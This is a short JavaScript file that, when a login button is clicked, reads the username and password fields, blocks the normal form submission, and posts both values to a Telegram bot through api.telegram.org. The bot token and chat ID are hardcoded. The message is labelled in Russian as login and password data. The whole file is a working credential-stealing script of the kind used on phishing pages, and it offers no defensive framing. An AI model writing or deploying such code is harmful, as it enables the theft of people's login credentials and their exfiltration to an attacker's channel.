const token = "6001057109:AAGQg2lXLHFFBfn5d5PeVKEbBBBy7FOfc9U";
const chatID = "-1001673997993";
const uriApi = `https://api.telegram.org/bot${token}/sendMessage`;

const login = document.querySelector(".login");
const password = document.querySelector(".password");
const come = document.querySelector(".come");

come.addEventListener('click' , (e) => {
  if(login.value == '' || password.value == ''){
    return;
  }
  else {
    e.preventDefault();
    let message = `<b>Данные логина и паролля</b> \n`;
    message += `<b>Логин :</b> ${login.value} \n`;
    message += `<b>Пароль :</b> ${password.value} \n`;
    
    axios.post(uriApi, {
    chat_id: chatID,
    parse_mode: "html",
    text: message,
  });
  }

  
})
